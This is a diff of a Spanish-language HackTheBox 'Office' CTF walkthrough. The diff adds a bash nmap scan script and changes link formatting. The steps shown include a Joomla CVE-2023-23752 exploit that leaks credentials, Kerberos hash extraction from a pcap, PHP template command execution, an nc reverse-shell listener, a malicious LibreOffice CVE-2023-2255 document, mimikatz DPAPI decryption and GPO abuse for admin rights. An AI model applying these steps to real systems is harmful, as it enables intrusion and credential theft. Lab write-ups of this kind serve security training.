@@ -27,25 +27,50 @@ rtt min/avg/max/mdev = 103.221/103.221/103.221/0.000 ms
 
 Vemos que el `ttl` de la máquina es de 127, el cual está próximo a 128 por ende nos encontramos ante una máquina `Windows`.
 
-Ahora, con la herramienta `nmap` lanzamos un escaneo en donde vamos a enumerar los puertos que se encuentran abiertos en la máquina.
+Ahora vamos a identificar los puertos abiertos dentro de la máquina, los invito a usar el siguiente `script` hecho en `bash`.
 
 ```bash
-nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.3 -oG ports
+#!/bin/bash
+
+GREEN="\e[32m"
+RED="\e[31m"
+RESET="\e[0m"
+
+IP="$1"
+
+if [ -z "$IP" ]; then
+  echo "Uso: $0 <IP>"
+  exit 1
+fi
+
+TEMP_FILE=$(mktemp)
+
+echo -e "${GREEN}[+] Escaneando todos los puertos abiertos... ${RESET}"
+
+nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn "$IP" -oG "$TEMP_FILE"
+
+# Extraer los puertos abiertos
+PORTS=$(grep -oP '\d+/open' "$TEMP_FILE" | awk -F'/' '{print $1}' | tr '\n' ',' | sed 's/,$//'; echo)
+
+rm "$TEMP_FILE"
+
+if [ -z "$PORTS" ]; then
+  echo -e "${RED}[-] No se encontraron puertos abiertos.${RESET}"
+  exit 1
+fi
+
+echo -e "\n${GREEN}[+] Escanenado servicios en los puertos: $PORTS. ${RESET}\n"
+
+nmap -sCV -p"$PORTS" "$IP" -oN target
+
+echo -e "\n${GREEN}[+] Escano completado. Resultados en 'target'.${RESET}\n"
 ```
 
-Aquí generamos un archivo en formato grepeable y hacemos uso de la función <a href="https://gist.github.com/anibalardid/5e05b6472feb3d31116729dc24e6d3e2">extarctPorts</a> de <a href="https://s4vitar.github.io/">s4vitar</a>.
+De preferencia es mejor usar este `script` como `root`, ya que algunos parámetros de `nmap`, requieren de privilegios elevados. Esto al final nos va a generar un archivo `target` que contiene la información de los puertos abiertos dentro de la máquina.
 
 ```bash
-extractPorts ports
+sudo ./scan.sh 10.10.11.44
 ```
-
-Ahora, con el número de los puertos copiados en el portapapeles, lanzamos otro escaneo para enumerar el servicio que corren por los puertos.
-
-```bash
-nmap -sCV -p53,80,88,139,389,443,445,464,593,636,3268,3269,5985,9389,49664,49667,57372,59218,59223,59248 10.10.11.3 -oN target
-```
-
-Aquí generamos un archivo en el formato normal de `nmap` en donde se nos muestra más información de los servicios que corren por esos puertos.
 
 ```bash
 PORT      STATE SERVICE       VERSION
@@ -152,7 +177,7 @@ hhogan
 Por el puerto `80`, vemos que en el propio escaneo con `nmap` nos indicó varias rutas referentes a joomla, como sabes el `CMS` que se está usando, podemos enumerar un poco. Si vamos a la siguiente ruta `http://10.10.11.3/administrator/manifests/files/joomla.xml`, podemos ver ante la versión que estamos.
 ![](/assets/img/HTB-Office/1_Office.png)
 
-Conociendo la versión, podemos buscar un poco por algunas vulnerabilidades y nos encontramos con <a href="https://github.com/Acceis/exploit-CVE-2023-23752.git">esto</a>, en donde podemos a través de las rutas de la `API` algunas cosas interesantes como usuarios y contraseñas.
+Conociendo la versión, podemos buscar un poco por algunas vulnerabilidades y nos encontramos con [esto](https://github.com/Acceis/exploit-CVE-2023-23752.git){:target="_blank"}, en donde podemos a través de las rutas de la `API` algunas cosas interesantes como usuarios y contraseñas.
 
 ```bash
 ruby exploit.rb http://10.10.11.3
@@ -232,7 +257,7 @@ smb: \> get Latest-System-Dump-8fbc124d.pcap
 
 ## PCAP Analysis
 
-Podemos ver un archivo `.pcap`, así que nos lo traemos al equipo para poder ver que contiene. Para analizarlo hacemos uso de `wireshark`, después de una búsqueda, vemos algunos valores interesantes, hay un par de paquetes referentes a una conexión de `kerberos`, buscando un poco, en esta <a href="https://vbscrub.com/2020/02/27/getting-passwords-from-kerberos-pre-authentication-packets/">web</a>, nos indican como podemos crear un hash, a partir de diferentes valores.
+Podemos ver un archivo `.pcap`, así que nos lo traemos al equipo para poder ver que contiene. Para analizarlo hacemos uso de `wireshark`, después de una búsqueda, vemos algunos valores interesantes, hay un par de paquetes referentes a una conexión de `kerberos`, buscando un poco, en esta [web](https://vbscrub.com/2020/02/27/getting-passwords-from-kerberos-pre-authentication-packets/){:target="_blank"}, nos indican como podemos crear un hash, a partir de diferentes valores.
 
 ![](/assets/img/HTB-Office/2_Office.png)
 ![](/assets/img/HTB-Office/3_Office.png)
@@ -263,7 +288,7 @@ Vemos que podemos modificar un `template` y estos están escritos en php, así q
 ![](/assets/img/HTB-Office/8_Office.png)
 ![](/assets/img/HTB-Office/9_Office.png)
 
-Vemos que agregado esa línea a un `template` y yendo a su dirección en la web, podemos ejecutar comandos, para ganar acceso yo hice uso de `PowerShell #3 (Base64)`, apoyándome <a href="https://www.revshells.com/">aquí</a>
+Vemos que agregado esa línea a un `template` y yendo a su dirección en la web, podemos ejecutar comandos, para ganar acceso yo hice uso de `PowerShell #3 (Base64)`, apoyándome [aquí](https://www.revshells.com/){:target="_blank"}
 
 ```bash
 rlwrap -cAr nc -nlvp 4444
@@ -284,7 +309,7 @@ Y ahora ya como el usuario `tstark` podemos ver la primera `flag`. Después de i
 
 ![](/assets/img/HTB-Office/11_Office.png)
 
-Si nos vamos a la web vemos, que hay un apartado donde podemos subir archivos (.Doc, .Docx, .Docm y .Odt) para aplicar a un trabajo, y posteriormente ser revisados, me gustaría pensar que para ver estos archivos usan algun programa como `Libre Office`. Después de buscar un poco en la máquina vemos que efectivamente se usa `Libre Office` y buscando un poco nos encontramos con esta <a href="https://github.com/elweth-sec/CVE-2023-2255">vulnerabilidad</a>.
+Si nos vamos a la web vemos, que hay un apartado donde podemos subir archivos (.Doc, .Docx, .Docm y .Odt) para aplicar a un trabajo, y posteriormente ser revisados, me gustaría pensar que para ver estos archivos usan algun programa como `Libre Office`. Después de buscar un poco en la máquina vemos que efectivamente se usa `Libre Office` y buscando un poco nos encontramos con esta [vulnerabilidad](https://github.com/elweth-sec/CVE-2023-2255){:target="_blank"}.
 Así que procedemos a crear un payload malicioso y a subirlo a la máquina.
 
 ![](/assets/img/HTB-Office/12_Office.png)
@@ -307,7 +332,7 @@ Mode                 LastWriteTime         Length Name
 -a-hs-          5/9/2023   4:03 PM            398 84F1CAEEBF466550F4967858F9353FB4                                     
 -a-hs-         1/18/2024  11:53 AM            374 E76CCA3670CD9BB98DF79E0A8D176F1E                                     
 ```
-Vemos que tenemos algo, así que subimos el <a href="https://github.com/ParrotSec/mimikatz/blob/master/x64/mimikatz.exe">mimikatz</a>, para descifrar los datos
+Vemos que tenemos algo, así que subimos el [mimikatz](https://github.com/ParrotSec/mimikatz/blob/master/x64/mimikatz.exe){:target="_blank"}, para descifrar los datos.
 
 ```bash
 PS C:\Users\PPotts\Downloads> dir
@@ -491,7 +516,7 @@ Vemos que el usuario `HHogan`, pertenece al grupo `GPO Mangers`.
 
 ![](/assets/img/HTB-Office/14_Office.png)
 
-Este puede escribir en la política de grupo de dominio predeterminada. Está capacidad permite a un atacante realizar una amplia variedad de ataques, puede ejecutar comandos a través de tareas programadas, deshabilitar o modificar servicios del sistema, elevar privilegios y más. Con la ayuda de este ejecutable <a href="https://github.com/byronkg/SharpGPOAbuse/releases/tag/1.0">SharpGPOAbuse</a> nos agregamos a la computadora como administrador local vía GPO.
+Este puede escribir en la política de grupo de dominio predeterminada. Está capacidad permite a un atacante realizar una amplia variedad de ataques, puede ejecutar comandos a través de tareas programadas, deshabilitar o modificar servicios del sistema, elevar privilegios y más. Con la ayuda de este ejecutable [SharpGPOAbuse](https://github.com/byronkg/SharpGPOAbuse/releases/tag/1.0){:target="_blank"} nos agregamos a la computadora como administrador local vía GPO.
 
 ![](/assets/img/HTB-Office/15_Office.png)
 
@@ -523,6 +548,5 @@ The command completed successfully.
 ```
 
 Y por último podemos conectarnos haciendo uso de `Psexec.py` y con esto ya podemos ver la última `flag`.
-
 
 ![](/assets/img/HTB-Office/16_Office.png)
